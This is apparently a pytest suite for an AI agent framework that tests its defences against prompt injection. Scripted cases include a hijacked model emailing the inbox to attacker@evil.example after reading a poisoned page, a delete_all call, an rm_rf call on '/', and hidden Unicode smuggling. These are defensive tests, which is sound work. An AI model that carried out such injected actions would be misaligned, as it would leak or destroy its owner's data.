from collections.abc import Iterator, Sequence
from contextlib import closing
from pathlib import Path
from typing import Any

import pytest

from bastion.core.agent import Agent, AgentLimits, Approver, TurnStop
from bastion.core.conversation import Conversation
from bastion.llm.types import Completion, Message, ProviderError, Role, StopReason, Usage
from bastion.security.approvals import ApprovalService
from bastion.security.audit import AuditLog
from bastion.security.policy import PolicyEngine, default_policy
from bastion.security.redact import Redactor
from bastion.storage.db import connect
from bastion.tools.base import Tool, ToolRegistry
from support.fakes import (
    INJECTION,
    BrokenApprover,
    DeleteAllTool,
    EchoTool,
    EmailArgs,
    ExplodingTool,
    PoisonedPageTool,
    ScriptedProvider,
    SendEmailTool,
    StubApprover,
    TextArgs,
    call,
    reply,
    use_tools,
)


@pytest.fixture
def audit(tmp_path: Path) -> Iterator[AuditLog]:
    with closing(connect(tmp_path / "bastion.db")) as conn:
        yield AuditLog(conn, b"k" * 32, Redactor())


def make_agent(
    provider: ScriptedProvider,
    audit: AuditLog,
    *,
    tools: Sequence[Tool[Any]] | None = None,
    approver: Approver | None = None,
    limits: AgentLimits | None = None,
) -> Agent:
    registry = ToolRegistry(tools if tools is not None else [EchoTool()])
    return Agent(
        provider=provider,
        tools=registry,
        policy=PolicyEngine(default_policy(), registry.names),
        approvals=ApprovalService(),
        approver=approver or StubApprover(answer=False),
        audit=audit,
        limits=limits or AgentLimits(),
    )


# ------------------------------------------------------------------ basics


async def test_plain_reply(audit: AuditLog) -> None:
    result = await make_agent(ScriptedProvider(reply("Hello!")), audit).run_turn(
        Conversation.new(), "hi"
    )

    assert result.reply == "Hello!"
    assert result.stop is TurnStop.COMPLETED
    assert [m.role for m in result.conversation.messages] == [Role.USER, Role.ASSISTANT]


async def test_owner_message_is_timestamped(audit: AuditLog) -> None:
    result = await make_agent(ScriptedProvider(reply("ok")), audit).run_turn(
        Conversation.new(), "what's on today?"
    )

    first = result.conversation.messages[0]
    assert first.text.startswith("[")
    assert first.text.endswith("what's on today?")


async def test_tool_result_is_returned_to_the_model(audit: AuditLog) -> None:
    echo = EchoTool()

    def check(messages: Sequence[Message]) -> Completion:
        result = messages[-1].tool_results[0]
        assert (result.content, result.is_error) == ("pong", False)
        return reply("done")

    provider = ScriptedProvider(use_tools(call("echo", text="pong")), check)
    result = await make_agent(provider, audit, tools=[echo]).run_turn(Conversation.new(), "ping")

    assert result.reply == "done"
    assert echo.calls == [TextArgs(text="pong")]


async def test_parallel_tool_calls_are_answered_in_one_message(audit: AuditLog) -> None:
    provider = ScriptedProvider(
        use_tools(call("echo", "a", text="1"), call("echo", "b", text="2")), reply("ok")
    )

    await make_agent(provider, audit).run_turn(Conversation.new(), "go")

    assert [r.call_id for r in provider.last_results(1)] == ["a", "b"]


async def test_urls_in_the_owners_message_become_fetchable(audit: AuditLog) -> None:
    result = await make_agent(ScriptedProvider(reply("ok")), audit).run_turn(
        Conversation.new(), "summarize https://example.com/post please"
    )

    assert result.conversation.provenance.allows("https://example.com/post")


# -------------------------------------------------------- argument checks


async def test_unknown_tools_are_denied(audit: AuditLog) -> None:
    provider = ScriptedProvider(use_tools(call("rm_rf", path="/")), reply("ok"))

    await make_agent(provider, audit).run_turn(Conversation.new(), "go")

    error = provider.last_results(1)[0]
    assert error.is_error
    assert "unknown tool" in error.content


async def test_invalid_arguments_are_rejected_before_execution(audit: AuditLog) -> None:
    echo = EchoTool()
    provider = ScriptedProvider(use_tools(call("echo", text="x", extra="nope")), reply("ok"))

    await make_agent(provider, audit, tools=[echo]).run_turn(Conversation.new(), "go")

    assert echo.calls == []
    assert "invalid arguments" in provider.last_results(1)[0].content


# ----------------------------------------------------------- taint & fences


async def test_untrusted_output_taints_the_conversation(audit: AuditLog) -> None:
    provider = ScriptedProvider(use_tools(call("read_page", url="https://x.example")), reply("ok"))

    result = await make_agent(provider, audit, tools=[PoisonedPageTool()]).run_turn(
        Conversation.new(), "read it"
    )

    assert result.conversation.taint.sources == ("web_fetch:evil.example",)


async def test_untrusted_output_is_fenced_and_cannot_close_its_fence(audit: AuditLog) -> None:
    provider = ScriptedProvider(use_tools(call("read_page", url="https://x.example")), reply("ok"))

    await make_agent(provider, audit, tools=[PoisonedPageTool()]).run_turn(
        Conversation.new(), "read it"
    )

    content = provider.last_results(1)[0].content
    assert content.startswith("<untrusted-data")
    assert INJECTION in content
    assert content.count("</untrusted-data") == 1


async def test_discovered_urls_become_fetchable(audit: AuditLog) -> None:
    provider = ScriptedProvider(use_tools(call("read_page", url="https://x.example")), reply("ok"))

    result = await make_agent(provider, audit, tools=[PoisonedPageTool()]).run_turn(
        Conversation.new(), "read it"
    )

    assert result.conversation.provenance.allows("https://evil.example/next")


# -------------------------------------------------- prompt-injection attacks


def _hijack_script(target_call: Any) -> ScriptedProvider:
    """The model reads a poisoned page, then (hijacked) proposes the attacker's action."""
    return ScriptedProvider(
        use_tools(call("read_page", url="https://evil.example")),
        use_tools(target_call),
        reply("Done."),
    )


@pytest.mark.security
async def test_injected_send_is_blocked_when_the_owner_declines(audit: AuditLog) -> None:
    sender, approver = SendEmailTool(), StubApprover(answer=False)
    provider = _hijack_script(call("send_email", "c2", to="attacker@evil.example", body="inbox"))

    await make_agent(
        provider, audit, tools=[PoisonedPageTool(), sender], approver=approver
    ).run_turn(Conversation.new(), "summarize that page")

    assert sender.sent == []
    assert len(approver.requests) == 1
    assert "attacker@evil.example" in approver.requests[0].arguments_json
    assert "web_fetch:evil.example" in approver.requests[0].reason
    assert "declined" in provider.last_results(2)[0].content


@pytest.mark.security
async def test_approved_send_runs_once_with_the_exact_arguments(audit: AuditLog) -> None:
    sender = SendEmailTool()
    provider = _hijack_script(call("send_email", "c2", to="alice@example.com", body="notes"))

    await make_agent(
        provider, audit, tools=[PoisonedPageTool(), sender], approver=StubApprover(answer=True)
    ).run_turn(Conversation.new(), "send Alice the notes")

    assert sender.sent == [EmailArgs(to="alice@example.com", body="notes")]


@pytest.mark.security
async def test_destructive_action_is_denied_outright_when_tainted(audit: AuditLog) -> None:
    deleter, approver = DeleteAllTool(), StubApprover(answer=True)
    provider = _hijack_script(call("delete_all", "c2", target="inbox"))

    await make_agent(
        provider, audit, tools=[PoisonedPageTool(), deleter], approver=approver
    ).run_turn(Conversation.new(), "summarize that page")

    assert deleter.calls == []
    assert approver.requests == []
    assert "Denied by policy" in provider.last_results(2)[0].content


@pytest.mark.security
async def test_destructive_action_in_a_clean_context_requires_step_up(audit: AuditLog) -> None:
    approver = StubApprover(answer=False)
    provider = ScriptedProvider(use_tools(call("delete_all", target="inbox")), reply("ok"))

    await make_agent(provider, audit, tools=[DeleteAllTool()], approver=approver).run_turn(
        Conversation.new(), "clean up"
    )

    assert approver.requests[0].step_up


@pytest.mark.security
async def test_taint_persists_into_later_turns(audit: AuditLog) -> None:
    approver = StubApprover(answer=False)
    provider = ScriptedProvider(
        use_tools(call("read_page", url="https://evil.example")),
        reply("Here is the summary."),
        use_tools(call("send_email", "c2", to="attacker@evil.example", body="inbox")),
        reply("ok"),
    )
    agent = make_agent(
        provider, audit, tools=[PoisonedPageTool(), SendEmailTool()], approver=approver
    )

    first = await agent.run_turn(Conversation.new(), "read the page")
    await agent.run_turn(first.conversation, "thanks")

    assert len(approver.requests) == 1


@pytest.mark.security
async def test_a_failing_approval_channel_fails_closed(audit: AuditLog) -> None:
    sender = SendEmailTool()
    provider = ScriptedProvider(
        use_tools(call("send_email", to="alice@example.com", body="hi")), reply("ok")
    )

    await make_agent(provider, audit, tools=[sender], approver=BrokenApprover()).run_turn(
        Conversation.new(), "email alice"
    )

    assert sender.sent == []


# ------------------------------------------------------------------ budgets


async def test_step_budget_stops_a_runaway_loop(audit: AuditLog) -> None:
    provider = ScriptedProvider(
        *[use_tools(call("echo", f"c{i}", text="again")) for i in range(10)]
    )

    result = await make_agent(provider, audit, limits=AgentLimits(max_steps=3)).run_turn(
        Conversation.new(), "go"
    )

    assert result.stop is TurnStop.BUDGET_EXHAUSTED
    assert len(provider.requests) == 3


async def test_tool_call_budget_caps_executions(audit: AuditLog) -> None:
    echo = EchoTool()
    calls = [call("echo", f"c{i}", text=str(i)) for i in range(8)]
    provider = ScriptedProvider(use_tools(*calls), reply("ok"))

    await make_agent(provider, audit, tools=[echo], limits=AgentLimits(max_tool_calls=3)).run_turn(
        Conversation.new(), "go"
    )

    results = provider.last_results(1)
    assert len(echo.calls) == 3
    assert len(results) == 8
    assert sum("budget" in r.content for r in results) == 5


async def test_token_budget_stops_the_turn(audit: AuditLog) -> None:
    provider = ScriptedProvider(use_tools(call("echo", text="x"), usage=Usage(600_000, 10)))

    result = await make_agent(provider, audit).run_turn(Conversation.new(), "go")

    assert result.stop is TurnStop.BUDGET_EXHAUSTED


# ------------------------------------------------------------------ failures


async def test_tool_crashes_are_contained_and_details_not_leaked(audit: AuditLog) -> None:
    provider = ScriptedProvider(use_tools(call("explode", text="x")), reply("ok"))

    result = await make_agent(provider, audit, tools=[ExplodingTool()]).run_turn(
        Conversation.new(), "go"
    )

    error = provider.last_results(1)[0]
    assert error.is_error
    assert "secret internal detail" not in error.content
    assert result.reply == "ok"


async def test_provider_errors_end_the_turn_gracefully(audit: AuditLog) -> None:
    def fail(messages: Sequence[Message]) -> Completion:
        raise ProviderError("rate limited", retryable=True)

    result = await make_agent(ScriptedProvider(fail), audit).run_turn(Conversation.new(), "hi")

    assert result.stop is TurnStop.PROVIDER_ERROR
    assert "rate limited" in result.reply


async def test_refusals_are_reported(audit: AuditLog) -> None:
    refusal = Completion(Message(Role.ASSISTANT), StopReason.REFUSAL, Usage(), "scripted-1")

    result = await make_agent(ScriptedProvider(refusal), audit).run_turn(Conversation.new(), "hi")

    assert result.stop is TurnStop.REFUSED
    assert "declined" in result.reply


async def test_truncated_tool_calls_still_get_results(audit: AuditLog) -> None:
    echo = EchoTool()
    truncated = Completion(
        Message(Role.ASSISTANT, tool_calls=(call("echo", text="x"),)),
        StopReason.MAX_TOKENS,
        Usage(),
        "scripted-1",
    )

    result = await make_agent(ScriptedProvider(truncated), audit, tools=[echo]).run_turn(
        Conversation.new(), "go"
    )

    assert echo.calls == []
    assert result.conversation.messages[-1].tool_results[0].is_error


# -------------------------------------------------------------------- audit


async def test_the_audit_chain_is_valid_after_a_turn(audit: AuditLog) -> None:
    provider = ScriptedProvider(use_tools(call("echo", text="x")), reply("ok"))

    await make_agent(provider, audit).run_turn(Conversation.new(), "go")

    events = [entry.event for entry in audit.tail(50)]
    assert audit.verify().ok
    assert {"turn.start", "llm.call", "policy.decision", "tool.result", "turn.end"} <= set(events)


async def test_the_owners_text_is_not_stored_in_the_audit_log(audit: AuditLog) -> None:
    await make_agent(ScriptedProvider(reply("ok")), audit).run_turn(
        Conversation.new(), "my private diary entry"
    )

    assert all("diary" not in str(entry.data) for entry in audit.tail(50))


# ------------------------------------------------------ review regressions


@pytest.mark.security
async def test_failures_after_contacting_an_attacker_taint_and_are_fenced(audit: AuditLog) -> None:
    from support.fakes import FailingFetchTool

    provider = ScriptedProvider(
        use_tools(call("fetch_fail", url="https://evil.example")), reply("ok")
    )

    result = await make_agent(provider, audit, tools=[FailingFetchTool()]).run_turn(
        Conversation.new(), "fetch it"
    )

    error = provider.last_results(1)[0].content
    assert result.conversation.taint.sources == ("web_fetch:evil.example",)
    assert "<untrusted-data" in error


@pytest.mark.security
async def test_invisible_characters_are_stripped_from_untrusted_output(audit: AuditLog) -> None:
    from support.fakes import SmugglingPageTool

    provider = ScriptedProvider(
        use_tools(call("read_smuggled", url="https://x.example")), reply("ok")
    )

    await make_agent(provider, audit, tools=[SmugglingPageTool()]).run_turn(
        Conversation.new(), "go"
    )

    content = provider.last_results(1)[0].content
    assert SmugglingPageTool.HIDDEN not in content
    assert "\u202e" not in content
    assert "Nice recipes." in content


@pytest.mark.security
async def test_the_audit_log_does_not_store_arguments_in_plaintext(audit: AuditLog) -> None:
    provider = ScriptedProvider(use_tools(call("echo", text="my secret diary entry")), reply("ok"))

    await make_agent(provider, audit).run_turn(Conversation.new(), "go")

    assert all("diary" not in str(entry.data) for entry in audit.tail(50))


@pytest.mark.security
async def test_lone_surrogates_from_the_model_cannot_crash_a_turn(audit: AuditLog) -> None:
    provider = ScriptedProvider(
        use_tools(call("echo", "a", text="bad\ud800"), call("ec\ud800ho", "b", text="x")),
        reply("still standing"),
    )

    result = await make_agent(provider, audit).run_turn(Conversation.new(), "go\udfff")

    assert result.reply == "still standing"
    assert "\\ud800" in provider.last_results(1)[1].content  # revealed, not raw
    assert audit.verify().ok
